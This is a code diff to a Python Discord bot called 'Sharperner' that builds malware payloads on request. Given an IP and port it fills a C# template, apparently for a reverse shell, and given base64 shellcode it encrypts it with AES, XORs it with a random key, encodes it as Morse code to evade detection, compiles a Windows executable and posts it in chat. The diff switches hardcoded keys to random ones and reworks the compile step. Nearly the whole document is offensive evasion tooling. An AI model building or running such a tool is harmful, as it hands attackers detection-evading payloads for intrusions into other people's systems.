@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import discord
 import os
+import subprocess
 from discord.ext.commands import Bot
 from dotenv import load_dotenv
 import re
@@ -8,6 +9,7 @@ import random
 import base64
 import binascii
 import itertools
+import string
 from Crypto.Cipher import AES
 from Crypto import Random
 
@@ -35,16 +37,25 @@ def _generateTemplateFile(template_path,ip_address, port):
     return updated
 
 def banner():
-    help = """```Usage: Sharperner 10.10.10.10 4004```"""
+    help = """```
+Usage:  !Sharperner 10.10.10.10 4004
+        !Sharperner <paste-b64-here>
+```"""
     return help
 
 def parse_cmd(cmd):
     return cmd.split(" ")
 
-def compiled():
-    cmd = f"{COMPILER} build --no-restore {PROJ_PATH} 2>/dev/null"
-    os.system(cmd)
-    if os.path.isfile(PROJ_OUTPUT):
+def iscompiled():
+    outfile_pattern = r"(\/.*[^\/]?\.exe)"
+    cmd = f"{COMPILER} build --no-restore {PROJ_PATH}"
+    result = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
+    cmd_output = result.stdout.decode('utf-8')
+    
+    output_filepath = re.findall(outfile_pattern, cmd_output)[0].strip()
+    PROJ_OUTPUT = output_filepath
+
+    if "Build succeeded" in cmd_output:
         return True
     else:
         return False
@@ -107,6 +118,51 @@ def morse_code_translate(shellcode):
             cipher += letter + ' '
     return cipher
 
+def gen_random_key(l):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=l))
+
+async def generate_shellcode_payload(message, blob):
+    if isBase64(blob):
+        await send_text(message, "Embeding your shellcode. Hope it works idk¯\_(ツ)_/¯")
+        raw_payload = aes_pad(base64.b64decode(blob))
+        
+        # aes encrypt
+        #aes_key = base64.b64decode("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc=") #temp
+        #aes_iv = base64.b64decode("bsxnWolsAyO7kCfWuyrnqg==") #temp
+        aes_key = os.urandom(32)
+        aes_iv = os.urandom(16)
+        aes_shellcode = AESEncrypt(raw_payload, aes_key, aes_iv)
+        
+        # xor with random key
+        #xor_key = "Sup3Rs3cur5k3y!"
+        xor_key = gen_random_key(16)
+        xoraes_shellcode = xor_encdec(aes_shellcode,xor_key)
+        b64xoraes_shellcode = base64.b64encode(xoraes_shellcode).decode('utf-8')
+        
+        # translate to morse code
+        b64aes_key = base64.b64encode(aes_key).decode('utf-8')
+        b64aes_iv = base64.b64encode(aes_iv).decode('utf-8')
+
+        morsed_xor_key = morse_code_translate(xor_key)
+        morsed_b64aes_key = morse_code_translate(b64aes_key)
+        morsed_b64aes_iv = morse_code_translate(b64aes_iv)
+        morsed_shellcode = morse_code_translate(b64xoraes_shellcode)
+        
+        template_path = f"{TEMPLATE_PATH}/shellcode_template.cs"
+        template = _generateShellcodeTemplateFile(template_path, morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode)
+        f = open(PROJ_MAIN,"w").write(template)
+
+    else:
+        await send_text(message, "Dude! this is not a base64 string")
+        await send_text(message, banner())
+
+async def generate_payload(message, ip_address, port):
+    template_path = f"{TEMPLATE_PATH}/template.cs"
+    template = _generateTemplateFile(template_path, ip_address, port)
+    
+    f = open(PROJ_MAIN,"w").write(template)
+    
+
 @client.event
 async def on_ready():
     print(f"We have logged in as {client.user}")
@@ -116,64 +172,35 @@ async def on_message(message):
     if message.author == client.user:
         return
     
-    if message.content.startswith('Sharperner'):
+    if message.content.startswith('!Sharperner'):
         cmd = parse_cmd(message.content)
         if(len(cmd) == 2):
             blob = cmd[1]
-            if isBase64(blob):
-                await send_text(message, "Ready for base64")
-                raw_payload = aes_pad(base64.b64decode(blob))
-                
-                # aes encrypt
-                aes_key = base64.b64decode("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc=") #temp
-                aes_iv = base64.b64decode("bsxnWolsAyO7kCfWuyrnqg==") #temp
-                aes_shellcode = AESEncrypt(raw_payload, aes_key, aes_iv)
-                
-                # xor with random key
-                xor_key = "Sup3Rs3cur5k3y!"
-                xoraes_shellcode = xor_encdec(aes_shellcode,xor_key)
-                b64xoraes_shellcode = base64.b64encode(xoraes_shellcode).decode('utf-8')
-                
-                # translate to morse code
-                b64aes_key = base64.b64encode(aes_key).decode('utf-8')
-                b64aes_iv = base64.b64encode(aes_iv).decode('utf-8')
-
-                morsed_xor_key = morse_code_translate(xor_key)
-                morsed_b64aes_key = morse_code_translate(b64aes_key)
-                morsed_b64aes_iv = morse_code_translate(b64aes_iv)
-                morsed_shellcode = morse_code_translate(b64xoraes_shellcode)
-                
-                template_path = f"{TEMPLATE_PATH}/shellcode_template.cs"
-                template = _generateShellcodeTemplateFile(template_path, morsed_xor_key,morsed_b64aes_key, morsed_b64aes_iv, morsed_shellcode)
-                f = open(PROJ_MAIN,"w").write(template)
-
-                if compiled():
-                    await send_file(message,PROJ_OUTPUT)
-                else:
-                    await send_text(message, "Sorry dude! something is wrong. Failed to compile")
-
+            await generate_shellcode_payload(message, blob) 
+            if iscompiled():
+                await send_file(message,PROJ_OUTPUT)
             else:
-                await send_text(message, "Dude! this is not a base64 string")
+                await send_text(message, "Sorry dude! something is wrong. Failed to compile")
+
         elif(len(cmd) == 3):
             if(not IsValidIp(cmd[1])):
                 await send_text(message, "Nope! not a valid IP. Dont trick me :))")
+                await send_text(message, banner())
                 return
             elif(not IsValidNumber(cmd[2])):
                 await send_text(message, "herm... invalid port ¯\_(ツ)_/¯")
+                await send_text(message, banner())
                 return
             else:
                 ip_address = cmd[1]
                 port = cmd[2]
                 
-                template_path = f"{TEMPLATE_PATH}/template.cs"
-                template = _generateTemplateFile(template_path, ip_address, port)
-                
-                f = open(PROJ_MAIN,"w").write(template)
-                
-                if compiled():
+                await generate_payload(message, ip_address, port)
+                if iscompiled():
                     await send_file(message,PROJ_OUTPUT)
                 else:
                     await send_text(message, "Sorry dude! something is wrong. Failed to compile")
+
         else:
             await say_hello(message)
             await send_text(message, banner())
